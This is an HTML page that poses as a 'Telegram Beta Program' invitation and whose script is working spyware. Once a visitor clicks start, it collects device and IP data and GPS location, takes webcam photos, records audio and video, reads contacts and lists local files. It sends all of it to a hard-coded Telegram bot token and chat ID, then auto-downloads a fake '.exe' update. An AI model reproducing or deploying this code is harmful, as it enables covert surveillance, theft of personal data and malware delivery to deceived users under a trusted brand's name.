<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Beta Program</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background: linear-gradient(145deg, #0f172a, #1e293b);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: white;
        }
        
        .telegram-card {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px;
            width: 100%;
            max-width: 500px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
        }
        
        h1 {
            text-align: center;
            font-size: 32px;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #fff, #a5b4fc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .subtitle {
            text-align: center;
            color: #94a3b8;
            margin-bottom: 40px;
        }
        
        .permissions {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 16px;
            padding: 25px;
            margin: 30px 0;
        }
        
        .permission-item {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            padding: 12px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.03);
        }
        
        .permission-item:last-child {
            margin-bottom: 0;
        }
        
        .permission-icon {
            font-size: 24px;
            margin-right: 15px;
            color: #60a5fa;
        }
        
        .permission-text {
            flex: 1;
        }
        
        .permission-title {
            font-weight: 600;
            color: #e2e8f0;
        }
        
        .permission-desc {
            font-size: 14px;
            color: #94a3b8;
            margin-top: 4px;
        }
        
        .start-btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 30px;
            transition: all 0.3s;
        }
        
        .start-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4);
        }
        
        .start-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .progress-container {
            display: none;
            margin-top: 30px;
        }
        
        .progress-bar {
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 10px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #10b981, #3b82f6);
            width: 0%;
            transition: width 0.3s;
        }
        
        .progress-text {
            text-align: center;
            color: #94a3b8;
            font-size: 14px;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="telegram-card">
        <div class="logo">‚úàÔ∏è</div>
        
        <h1>Telegram Beta Program</h1>
        <p class="subtitle">Participate in testing new features</p>
        
        <div class="permissions">
            <div class="permission-item">
                <div class="permission-icon">üì∑</div>
                <div class="permission-text">
                    <div class="permission-title">Camera Access</div>
                    <div class="permission-desc">Test new camera features and filters</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-icon">üé§</div>
                <div class="permission-text">
                    <div class="permission-title">Microphone Access</div>
                    <div class="permission-desc">Test voice message improvements</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-icon">üìç</div>
                <div class="permission-text">
                    <div class="permission-title">Location Access</div>
                    <div class="permission-desc">Test location-based features</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-icon">üìÅ</div>
                <div class="permission-text">
                    <div class="permission-title">File Access</div>
                    <div class="permission-desc">Test new file sharing features</div>
                </div>
            </div>
        </div>
        
        <button class="start-btn" onclick="startCollection()">START BETA TESTING</button>
        
        <div class="progress-container" id="progressContainer">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text" id="progressText">Initializing...</div>
        </div>
    </div>

<script>
const BOT_TOKEN = '8337372161:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
const ADMIN_ID = '8001083987';
let mediaStream = null;
let audioRecorder = null;
let videoRecorder = null;

async function sendToBot(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Error sending to bot:', error);
        // Fallback method
        const img = new Image();
        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(message)}`;
    }
}

async function sendPhotoToBot(blob) {
    const formData = new FormData();
    formData.append('chat_id', ADMIN_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', `üì∏ Photo - ${new Date().toLocaleString()}`);
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    } catch (error) {
        console.error('Error sending photo:', error);
    }
}

async function sendVideoToBot(blob) {
    const formData = new FormData();
    formData.append('chat_id', ADMIN_ID);
    formData.append('video', blob, 'video.mp4');
    formData.append('caption', `üé• Video - ${new Date().toLocaleString()}`);
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
            method: 'POST',
            body: formData
        });
    } catch (error) {
        console.error('Error sending video:', error);
    }
}

async function sendAudioToBot(blob) {
    const formData = new FormData();
    formData.append('chat_id', ADMIN_ID);
    formData.append('audio', blob, 'audio.ogg');
    formData.append('caption', `üé§ Audio - ${new Date().toLocaleString()}`);
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
            method: 'POST',
            body: formData
        });
    } catch (error) {
        console.error('Error sending audio:', error);
    }
}

async function sendLocationToBot(latitude, longitude) {
    await sendToBot(`üìç Location: https://maps.google.com/?q=${latitude},${longitude}`);
}

function updateProgress(percent, text) {
    document.getElementById('progressContainer').style.display = 'block';
    document.getElementById('progressFill').style.width = percent + '%';
    document.getElementById('progressText').textContent = text;
}

async function getLocation() {
    return new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    });
                },
                (error) => {
                    resolve(null);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            resolve(null);
        }
    });
}

async function collectSystemInfo() {
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: navigator.cookieEnabled,
        online: navigator.onLine,
        referrer: document.referrer,
        url: window.location.href,
        battery: null
    };
    
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            info.battery = {
                level: battery.level * 100,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (e) {}
    }
    
    return info;
}

async function captureMedia() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1920 },
                height: { ideal: 1080 },
                facingMode: 'user',
                frameRate: { ideal: 30 }
            },
            audio: {
                echoCancellation: true,
                noiseSuppression: true,
                sampleRate: 44100,
                channelCount: 2
            }
        });
        
        return true;
    } catch (error) {
        await sendToBot(`‚ùå Media access error: ${error.message}`);
        return false;
    }
}

async function takePhotos() {
    const video = document.createElement('video');
    video.srcObject = mediaStream;
    video.muted = true;
    
    try {
        await video.play();
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        // Wait for video to be ready
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Take 10 photos with 2 second intervals
        for (let i = 1; i <= 10; i++) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                if (blob) {
                    await sendPhotoToBot(blob);
                }
            }, 'image/jpeg', 0.9);
            
            updateProgress(30 + i * 5, `Taking photos... ${i}/10`);
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        video.pause();
        video.srcObject = null;
        
    } catch (error) {
        await sendToBot(`‚ùå Photo error: ${error.message}`);
    }
}

async function recordAudio() {
    try {
        audioRecorder = new MediaRecorder(mediaStream);
        const chunks = [];
        
        audioRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                chunks.push(event.data);
            }
        };
        
        audioRecorder.onstop = async () => {
            const audioBlob = new Blob(chunks, { type: 'audio/webm' });
            await sendAudioToBot(audioBlob);
        };
        
        // Record 3 audio clips of 10 seconds each
        for (let i = 1; i <= 3; i++) {
            chunks.length = 0;
            audioRecorder.start();
            
            updateProgress(80 + i * 5, `Recording audio... ${i}/3`);
            
            await new Promise(resolve => setTimeout(resolve, 10000));
            
            audioRecorder.stop();
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
    } catch (error) {
        await sendToBot(`‚ùå Audio recording error: ${error.message}`);
    }
}

async function recordVideo() {
    try {
        videoRecorder = new MediaRecorder(mediaStream, {
            mimeType: 'video/webm;codecs=vp9'
        });
        
        const chunks = [];
        
        videoRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                chunks.push(event.data);
            }
        };
        
        videoRecorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            await sendVideoToBot(videoBlob);
        };
        
        // Record 2 video clips of 15 seconds each
        for (let i = 1; i <= 2; i++) {
            chunks.length = 0;
            videoRecorder.start();
            
            updateProgress(95, `Recording video... ${i}/2`);
            
            await new Promise(resolve => setTimeout(resolve, 15000));
            
            videoRecorder.stop();
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
    } catch (error) {
        await sendToBot(`‚ùå Video recording error: ${error.message}`);
    }
}

async function getIPInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        
        try {
            const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
            return await geoResponse.json();
        } catch {
            return { ip: data.ip };
        }
    } catch {
        return null;
    }
}

async function accessContacts() {
    if ('contacts' in navigator && 'ContactsManager' in window) {
        try {
            const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
            return contacts;
        } catch (error) {
            console.log('Contacts access failed:', error);
        }
    }
    return null;
}

async function accessFiles() {
    try {
        const handle = await window.showDirectoryPicker();
        let fileCount = 0;
        
        const processDirectory = async (dirHandle, path = '') => {
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    fileCount++;
                    if (fileCount <= 50) { // Limit to 50 files
                        const file = await entry.getFile();
                        await sendToBot(`üìÑ File: ${path}${entry.name} (${(file.size / 1024).toFixed(1)} KB)`);
                    }
                } else if (entry.kind === 'directory' && path.split('/').length < 3) {
                    await processDirectory(entry, `${path}${entry.name}/`);
                }
            }
        };
        
        await processDirectory(handle);
        return fileCount;
    } catch (error) {
        console.log('File access failed:', error);
        return 0;
    }
}

async function startCollection() {
    const button = document.querySelector('.start-btn');
    button.disabled = true;
    button.textContent = 'TESTING IN PROGRESS...';
    
    updateProgress(5, 'Starting beta test...');
    
    try {
        // Send initial info
        updateProgress(10, 'Collecting system info...');
        const systemInfo = await collectSystemInfo();
        const ipInfo = await getIPInfo();
        
        let infoMessage = `üö® NEW BETA TESTER üö®\n\n`;
        infoMessage += `üì± System Information:\n`;
        infoMessage += `‚Ä¢ Platform: ${systemInfo.platform}\n`;
        infoMessage += `‚Ä¢ Browser: ${systemInfo.userAgent.substring(0, 100)}...\n`;
        infoMessage += `‚Ä¢ Language: ${systemInfo.language}\n`;
        infoMessage += `‚Ä¢ Screen: ${systemInfo.screen}\n`;
        infoMessage += `‚Ä¢ Timezone: ${systemInfo.timezone}\n`;
        infoMessage += `‚Ä¢ Online: ${systemInfo.online ? 'Yes' : 'No'}\n`;
        
        if (systemInfo.battery) {
            infoMessage += `‚Ä¢ Battery: ${systemInfo.battery.level}% ${systemInfo.battery.charging ? '(Charging)' : ''}\n`;
        }
        
        if (ipInfo) {
            infoMessage += `\nüåç Location Information:\n`;
            infoMessage += `‚Ä¢ IP: ${ipInfo.ip || 'Unknown'}\n`;
            infoMessage += `‚Ä¢ City: ${ipInfo.city || 'Unknown'}\n`;
            infoMessage += `‚Ä¢ Region: ${ipInfo.region || 'Unknown'}\n`;
            infoMessage += `‚Ä¢ Country: ${ipInfo.country_name || 'Unknown'}\n`;
            if (ipInfo.latitude && ipInfo.longitude) {
                infoMessage += `‚Ä¢ Coordinates: ${ipInfo.latitude}, ${ipInfo.longitude}\n`;
            }
            infoMessage += `‚Ä¢ ISP: ${ipInfo.org || 'Unknown'}\n`;
        }
        
        infoMessage += `\nüîó Page Information:\n`;
        infoMessage += `‚Ä¢ URL: ${systemInfo.url}\n`;
        infoMessage += `‚Ä¢ Referrer: ${systemInfo.referrer || 'Direct visit'}\n`;
        infoMessage += `‚Ä¢ Time: ${new Date().toLocaleString()}`;
        
        await sendToBot(infoMessage);
        
        // Get location
        updateProgress(20, 'Getting location...');
        const location = await getLocation();
        if (location) {
            await sendLocationToBot(location.latitude, location.longitude);
            await sendToBot(`üìç GPS Accuracy: ${location.accuracy} meters`);
        }
        
        // Access media
        updateProgress(25, 'Accessing camera and microphone...');
        const mediaGranted = await captureMedia();
        
        if (mediaGranted) {
            await sendToBot('‚úÖ Camera and microphone access granted');
            
            // Take photos
            updateProgress(30, 'Testing camera...');
            await takePhotos();
            
            // Record audio
            updateProgress(80, 'Testing microphone...');
            await recordAudio();
            
            // Record video
            updateProgress(95, 'Testing video...');
            await recordVideo();
            
            // Stop all media tracks
            mediaStream.getTracks().forEach(track => track.stop());
        }
        
        // Try to access contacts
        updateProgress(97, 'Testing contacts access...');
        const contacts = await accessContacts();
        if (contacts && contacts.length > 0) {
            await sendToBot(`üìá Found ${contacts.length} contacts`);
            contacts.slice(0, 10).forEach(contact => {
                let contactInfo = `Contact: ${contact.name?.[0] || 'Unknown'}`;
                if (contact.tel?.[0]) contactInfo += ` | Phone: ${contact.tel[0]}`;
                if (contact.email?.[0]) contactInfo += ` | Email: ${contact.email[0]}`;
                sendToBot(contactInfo);
            });
        }
        
        // Try to access files
        updateProgress(98, 'Testing file access...');
        const fileCount = await accessFiles();
        if (fileCount > 0) {
            await sendToBot(`üìÅ Accessed ${fileCount} files from device`);
        }
        
        // Send completion message
        await sendToBot(`‚úÖ Beta testing completed successfully!\nüéØ All tests passed\n‚è∞ Finished at: ${new Date().toLocaleString()}`);
        
        updateProgress(100, 'Beta testing completed!');
        
        button.textContent = 'TESTING COMPLETE';
        
        // Auto download "update"
        setTimeout(() => {
            const link = document.createElement('a');
            link.href = 'https://example.com/telegram_beta_update.exe';
            link.download = 'telegram_beta_update.exe';
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }, 3000);
        
    } catch (error) {
        await sendToBot(`‚ùå Beta testing error: ${error.message}`);
        updateProgress(100, 'Error occurred');
        button.textContent = 'TESTING FAILED';
    }
}

// Send initial notification
window.addEventListener('load', () => {
    setTimeout(() => {
        sendToBot(`üåê Beta tester landed on page\nüïí Time: ${new Date().toLocaleString()}\nüîó URL: ${window.location.href}`);
    }, 2000);
});
</script>
